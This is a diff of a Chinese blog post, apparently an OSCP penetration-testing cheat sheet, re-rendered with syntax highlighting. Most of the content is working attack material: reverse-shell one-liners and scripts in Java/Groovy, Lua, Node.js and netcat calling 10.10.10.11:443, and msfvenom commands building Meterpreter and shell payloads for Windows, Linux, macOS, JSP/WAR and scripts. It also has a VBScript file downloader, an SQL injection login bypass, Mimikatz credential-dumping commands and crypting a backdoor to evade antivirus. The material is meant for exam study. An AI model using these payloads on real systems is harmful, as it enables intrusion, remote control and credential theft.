-<pre><code class="java">String host=&quot;127.0.0.1&quot;;
-int port=4444;
-String cmd=&quot;cmd.exe&quot;;
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>
+<pre><code class="hljs java">String host=<span class="hljs-string">"127.0.0.1"</span>;
+<span class="hljs-keyword">int</span> port=<span class="hljs-number">4444</span>;
+String cmd=<span class="hljs-string">"cmd.exe"</span>;
+Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-keyword">true</span>).start();Socket s=<span class="hljs-keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span> &#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</code></pre>
+
 <p>创建线程：</p>
-<pre><code class="java">Thread thread = new Thread(){
-    public void run(){
-        // Reverse shell here
-    }
-}
+<pre><code class="hljs java">Thread thread = <span class="hljs-keyword">new</span> Thread()&#123;
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span>&#123;
+        <span class="hljs-comment">// Reverse shell here</span>
+    &#125;
+&#125;
 thread.start();</code></pre>
+
 <h4 id="16、生成War文件反弹shell"><a href="#16、生成War文件反弹shell" class="headerlink" title="16、生成War文件反弹shell"></a>16、生成War文件反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>使用如下命令生成war文件：</p>
-<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war &gt; reverse.war</code></pre>
+<pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war &gt; reverse.war</code></pre>
+
 <p>查看war包中shell的jsp文件名</p>
-<pre><code class="bash">strings reverse.war | grep jsp</code></pre>
+<pre><code class="hljs bash">strings reverse.war | grep jsp</code></pre>
+
 <p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p>
 <h4 id="17、使用Lua脚本反弹shell"><a href="#17、使用Lua脚本反弹shell" class="headerlink" title="17、使用Lua脚本反弹shell"></a>17、使用Lua脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：<br>Linux平台：</p>
-<pre><code class="bash">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.10.10.11&#39;,&#39;443&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre>
+<pre><code class="hljs bash">lua -e <span class="hljs-string">"require('socket');require('os');t=socket.tcp();t:connect('10.10.10.11','443');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></code></pre>
+
 <p>Windows及Linux平台：</p>
-<pre><code class="bash">lua5.1 -e &#39;local host, port = &quot;10.10.10.11&quot;, 443 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;</code></pre>
+<pre><code class="hljs bash">lua5.1 -e <span class="hljs-string">'local host, port = "10.10.10.11", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</span></code></pre>
+
 <h4 id="18、NodeJS版本反弹shell"><a href="#18、NodeJS版本反弹shell" class="headerlink" title="18、NodeJS版本反弹shell"></a>18、NodeJS版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="js">(function(){
-    var net = require(&quot;net&quot;),
-        cp = require(&quot;child_process&quot;),
-        sh = cp.spawn(&quot;/bin/sh&quot;, []);
-    var client = new net.Socket();
-    client.connect(443, &quot;10.10.10.11&quot;, function(){
+<pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;
+    <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">"net"</span>),
+        cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>),
+        sh = cp.spawn(<span class="hljs-string">"/bin/sh"</span>, []);
+    <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket();
+    client.connect(<span class="hljs-number">443</span>, <span class="hljs-string">"10.10.10.11"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
-    });
-    return /a/; 
-})();</code></pre>
-<pre><code class="js">require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.10.10.11 443&#39;)</code></pre>
-<pre><code class="js">-var x = global.process.mainModule.require
--x(&#39;child_process&#39;).exec(&#39;nc 10.10.10.11 443 -e /bin/bash&#39;)</code></pre>
-<pre><code class="bash">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</code></pre>
+    &#125;);
+    <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span>; 
+&#125;)();</code></pre>
+
+<pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).exec(<span class="hljs-string">'nc -e /bin/sh 10.10.10.11 443'</span>)</code></pre>
+
+<pre><code class="hljs js">-<span class="hljs-keyword">var</span> x = global.process.mainModule.require
+-x(<span class="hljs-string">'child_process'</span>).exec(<span class="hljs-string">'nc 10.10.10.11 443 -e /bin/bash'</span>)</code></pre>
+
+<pre><code class="hljs bash">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</code></pre>
+
 <h4 id="19、Groovy版本反弹shell"><a href="#19、Groovy版本反弹shell" class="headerlink" title="19、Groovy版本反弹shell"></a>19、Groovy版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">String host=&quot;10.10.10.11&quot;;
+<pre><code class="hljs bash">String host=<span class="hljs-string">"10.10.10.11"</span>;
 int port=443;
-String cmd=&quot;cmd.exe&quot;;
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>
-<h4 id="20、生成Meterpreter反弹Shell"><a href="#20、生成Meterpreter反弹Shell" class="headerlink" title="20、生成Meterpreter反弹Shell:"></a>20、生成Meterpreter反弹Shell:</h4><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre>
-<pre><code class="bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre>
-<pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre>
-<pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre>
-<pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f elf &gt; shell.elf</code></pre>
-<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f exe &gt; shell.exe</code></pre>
-<pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f macho &gt; shell.macho</code></pre>
-<pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f asp &gt; shell.asp</code></pre>
-<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.jsp</code></pre>
-<pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;10.10.10.11&quot; LPORT=443 -f war &gt; shell.war</code></pre>
-<pre><code class="bash">msfvenom -p cmd/unix/reverse_python LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.py</code></pre>
-<pre><code class="bash">msfvenom -p cmd/unix/reverse_bash LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.sh</code></pre>
-<pre><code class="bash">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;10.10.10.11&quot; LPORT=443 -f raw &gt; shell.pl</code></pre>
+String cmd=<span class="hljs-string">"cmd.exe"</span>;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;0)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;0)so.write(pe.read());<span class="hljs-keyword">while</span>(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();<span class="hljs-built_in">break</span>;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</code></pre>
+
+
+
+<h4 id="20、生成Meterpreter反弹Shell"><a href="#20、生成Meterpreter反弹Shell" class="headerlink" title="20、生成Meterpreter反弹Shell:"></a>20、生成Meterpreter反弹Shell:</h4><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f elf &gt; shell.elf</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f exe &gt; shell.exe</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f macho &gt; shell.macho</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f asp &gt; shell.asp</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f raw &gt; shell.jsp</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f war &gt; shell.war</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_python LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f raw &gt; shell.py</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_bash LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f raw &gt; shell.sh</code></pre>
+
+<pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_perl LHOST=<span class="hljs-string">"10.10.10.11"</span> LPORT=443 -f raw &gt; shell.pl</code></pre>
+
 <h4 id="21、使用Xterm反弹shell"><a href="#21、使用Xterm反弹shell" class="headerlink" title="21、使用Xterm反弹shell"></a>21、使用Xterm反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">xterm -display 10.10.10.11:1
+<pre><code class="hljs bash">xterm -display 10.10.10.11:1
 Xnest :1
 xhost +targetip</code></pre>
+
 <p>参考链接：<br><a href="https://krober.biz/misc/reverse_shell.php?ip=10.10.10.11&amp;port=443" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php?ip=10.10.10.11&amp;port=443</a></p>
 <h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>后期攻击是指攻击者在对目标获得某种程度的控制后所执行的操作。</p>
 <ul>
@@ -986,32 +928,33 @@ xhost +targetip</code></pre>
 <li><p>在Windows上创建wget VB脚本：<a href="http://web.archive.org/web/20171113221652/https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt" target="_blank" rel="noopener"><em>https</em></a> :<br><a href="http://web.archive.org/web/20171113221652/https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt" target="_blank" rel="noopener"><em>//github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt</em></a></p>
 </li>
 <li><p>可以粘贴到命令行的Windows文件传输脚本。没有Meterpreter外壳，将文件传输到Windows机器可能很棘手。可以将以下脚本复制并粘贴到基本的Windows反向窗口中，并用于从Web服务器传输文件（每行之后都需要timeout 1命令）：</p>
-<pre><code> echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
- timeout 1
- echo Url = &quot;http://1.1.1.1/windows-privesc-check2.exe&quot;  &gt;&gt; webdl.vbs
- timeout 1
- echo dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)  &gt;&gt; webdl.vbs
- timeout 1
- echo dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)  &gt;&gt; webdl.vbs
- timeout 1
- echo xHttp.Open &quot;GET&quot;, Url, False  &gt;&gt; webdl.vbs
- timeout 1
- echo xHttp.Send  &gt;&gt; webdl.vbs
- timeout 1
- echo with bStrm      &gt;&gt; webdl.vbs
- timeout 1
- echo     .type = 1 &#39;      &gt;&gt; webdl.vbs
- timeout 1
- echo     .open      &gt;&gt; webdl.vbs
- timeout 1
- echo     .write xHttp.responseBody      &gt;&gt; webdl.vbs
- timeout 1
- echo     .savetofile &quot;C:\temp\windows-privesc-check2.exe&quot;, 2 &#39;  &gt;&gt; webdl.vbs
- timeout 1
- echo end with &gt;&gt; webdl.vbs
- timeout 1
- echo
-</code></pre><p>可以使用以下语法运行该文件：</p>
+<pre><code class="hljs coq">echo <span class="hljs-keyword">Set</span> args = Wscript.<span class="hljs-keyword">Arguments</span>  &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo Url = <span class="hljs-string">"http://1.1.1.1/windows-privesc-check2.exe"</span>  &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo dim xHttp: <span class="hljs-keyword">Set</span> xHttp = createobject(<span class="hljs-string">"Microsoft.XMLHTTP"</span>)  &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo dim bStrm: <span class="hljs-keyword">Set</span> bStrm = createobject(<span class="hljs-string">"Adodb.Stream"</span>)  &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo xHttp.<span class="hljs-keyword">Open</span> <span class="hljs-string">"GET"</span>, Url, False  &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo xHttp.Send  &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo <span class="hljs-built_in">with</span> bStrm      &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo 	.type = <span class="hljs-number">1</span> '      &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo 	.open      &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo 	.write xHttp.responseBody      &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo 	.savetofile <span class="hljs-string">"C:\temp\windows-privesc-check2.exe"</span>, <span class="hljs-number">2</span> '  &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo <span class="hljs-keyword">end</span> <span class="hljs-built_in">with</span> &gt;&gt; webdl.vbs
+<span class="hljs-built_in">timeout</span> <span class="hljs-number">1</span>
+echo</code></pre>
+
+<p>可以使用以下语法运行该文件：</p>
 <p><code>C:\temp\cscript.exe webdl.vbs</code></p>
 </li>
 <li><p>挂载文件共享</p>
@@ -1050,9 +993,9 @@ xhost +targetip</code></pre>
 </ul>
 <h3 id="压缩打包文件"><a href="#压缩打包文件" class="headerlink" title="压缩打包文件"></a>压缩打包文件</h3><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><h3 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h3><h2 id="客户端、网页及密码攻击"><a href="#客户端、网页及密码攻击" class="headerlink" title="客户端、网页及密码攻击"></a>客户端、网页及密码攻击</h2><h3 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h3><h3 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h3><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><h3 id="数据库漏洞"><a href="#数据库漏洞" class="headerlink" title="数据库漏洞"></a>数据库漏洞</h3><ul>
 <li><p>身份验证绕过</p>
-<pre><code>  name=&#39;wronguser&#39; or 1=1;  
-  name=&#39;wronguser&#39; or 1=1 LIMIT 1;
-</code></pre></li>
+<pre><code class="hljs ini"><span class="hljs-attr">name</span>=<span class="hljs-string">'wronguser'</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">;  </span>
+<span class="hljs-attr">name</span>=<span class="hljs-string">'wronguser'</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> LIMIT <span class="hljs-number">1</span><span class="hljs-comment">;</span></code></pre>
+</li>
 <li><p>枚举数据库</p>
 <p><code>http://192.168.11.35/comment.php?id=738)&#39;</code></p>
 <p>详细错误消息？</p>
@@ -1138,13 +1081,13 @@ xhost +targetip</code></pre>
 <li><p>Mimikatz</p>
 <ul>
 <li><p>extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets<br><a href="http://web.archive.org/web/20171113221652/https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener"><em>https://github.com/gentilkiwi/mimikatz</em></a> From metasploit meterpreter (must have System level access):</p>
-<pre><code>meterpreter&gt; load mimikatz
-meterpreter&gt; help mimikatz
-meterpreter&gt; msv
-meterpreter&gt; kerberos
-meterpreter&gt; mimikatz_command -f samdump::hashes
-meterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords
-</code></pre></li>
+<pre><code class="hljs shell"><span class="hljs-meta">meterpreter&gt;</span><span class="bash"> load mimikatz</span>
+<span class="hljs-meta">meterpreter&gt;</span><span class="bash"> <span class="hljs-built_in">help</span> mimikatz</span>
+<span class="hljs-meta">meterpreter&gt;</span><span class="bash"> msv</span>
+<span class="hljs-meta">meterpreter&gt;</span><span class="bash"> kerberos</span>
+<span class="hljs-meta">meterpreter&gt;</span><span class="bash"> mimikatz_command -f samdump::hashes</span>
+<span class="hljs-meta">meterpreter&gt;</span><span class="bash"> mimikatz_command -f sekurlsa::searchPasswords</span></code></pre>
+</li>
 </ul>
 </li>
 <li><p>Hydra</p>
@@ -1189,10 +1132,12 @@ meterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords
 <li><p>在线密码破解<br><a href="http://web.archive.org/web/20171113221652/https://crackstation.net/" target="_blank" rel="noopener"><em>https://crackstation.net/</em> </a> <a href="http://web.archive.org/web/20171113221652/http://finder.insidepro.com/" target="_blank" rel="noopener"><em>http://finder.insidepro.com/</em></a></p>
 </li>
 <li><p>Hashcat需要安装新的驱动程序才能使我的GPU Cracking在Kali linux VM上运行，并且我还必须使用–force参数。</p>
-<pre><code>apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev
-</code></pre><p>和</p>
-<pre><code>apt-get install pocl-opencl-icd
-</code></pre></li>
+<pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install libhwloc-<span class="hljs-built_in">dev</span> ocl-icd-<span class="hljs-built_in">dev</span> ocl-icd-opencl-<span class="hljs-built_in">dev</span></code></pre>
+
+<p>和</p>
+<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install pocl-opencl-icd</code></pre>
+
+</li>
 </ul>
 <h2 id="网络隧道，端口转发"><a href="#网络隧道，端口转发" class="headerlink" title="网络隧道，端口转发"></a>网络隧道，端口转发</h2><h2 id="Metasploit框架"><a href="#Metasploit框架" class="headerlink" title="Metasploit框架"></a>Metasploit框架</h2><ul>
 <li><p>Metasploit</p>
@@ -1218,12 +1163,12 @@ meterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords
 <p><code>show auxiliary</code></p>
 </li>
 <li><p>使用模块</p>
-<pre><code>use auxiliary/scanner/snmp/snmp_enum  
-use auxiliary/scanner/http/webdav_scanner  
-use auxiliary/scanner/smb/smb_version  
-use auxiliary/scanner/ftp/ftp_login  
-use exploit/windows/pop3/seattlelab_pass
-</code></pre></li>
+<pre><code class="hljs sql"><span class="hljs-keyword">use</span> auxiliary/scanner/snmp/snmp_enum  
+<span class="hljs-keyword">use</span> auxiliary/scanner/<span class="hljs-keyword">http</span>/webdav_scanner  
+<span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_version  
+<span class="hljs-keyword">use</span> auxiliary/scanner/<span class="hljs-keyword">ftp</span>/ftp_login  
+<span class="hljs-keyword">use</span> exploit/windows/pop3/seattlelab_pass</code></pre>
+</li>
 <li><p>显示模块的基本信息</p>
 <p><code>info</code></p>
 </li>
@@ -1231,9 +1176,9 @@ use exploit/windows/pop3/seattlelab_pass
 <p><code>show options</code></p>
 </li>
 <li><p>设置模块的选项</p>
-<pre><code>set RHOSTS 192.168.1.1-254  
-set THREADS 10
-</code></pre></li>
+<pre><code class="hljs angelscript"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">-254</span>  
+<span class="hljs-keyword">set</span> THREADS <span class="hljs-number">10</span></code></pre>
+</li>
 <li><p>运行模块</p>
 <p><code>run</code></p>
 </li>
@@ -1272,13 +1217,14 @@ set THREADS 10
 <li><p>使用软件保护程序加密已知恶意软件</p>
 <ul>
 <li><p>一种这样的开源加密程序称为Hyperion</p>
-<pre><code>cp /usr/share/windows-binaries/Hyperion-1.0.zip   
-解压缩Hyperion-1.0.zip   cd Hyperion-1.0 /   
+<pre><code class="hljs crystal">cp /usr/share/windows-binaries/Hyperion-<span class="hljs-number">1.0</span>.zip   
+解压缩Hyperion-<span class="hljs-number">1.0</span>.zip   cd Hyperion-<span class="hljs-number">1.0</span> /   
 i686-w64-mingw32-g ++ Src / Crypter / * .cpp -o   hyperion.exe 
-cp -p / usr /lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll 。  
-cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll 。  
-酒hyperion.exe ../backdoor.exe ../crypted.exe
-</code></pre></li>
+cp -p / usr /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">gcc</span>/<span class="hljs-title">i686</span>-<span class="hljs-title">w64</span>-<span class="hljs-title">mingw32</span>/5.3-<span class="hljs-title">win32</span>/<span class="hljs-title">libgcc_s_sjlj</span>-1.<span class="hljs-title">dll</span> 。  </span>
+cp -p /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">gcc</span>/<span class="hljs-title">i686</span>-<span class="hljs-title">w64</span>-<span class="hljs-title">mingw32</span>/5.3-<span class="hljs-title">win32</span>/<span class="hljs-title">libstdc</span>++-6.<span class="hljs-title">dll</span> 。  </span>
+酒hyperion.exe ../backdoor.exe ../crypted.exe</code></pre>
+
+</li>
 </ul>
 </li>
 </ul>
@@ -1293,811 +1239,327 @@ cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll 。
 <p><strong>8、Windows提权辅助辅助工具</strong>：<a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">https://github.com/bitsadmin/wesng</a></p>
 
             </div>
-            <hr/>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/OSCP/">OSCP</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/09/03/whatweb/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">网站指纹识别-whatweb</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/09/01/Tmux/">
+                        <span class="hidden-mobile">Tmux学习记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
             
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">uaa</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="https://827607240.github.io/2020/09/01/OSCP/">https://827607240.github.io/2020/09/01/OSCP/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">uaa</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
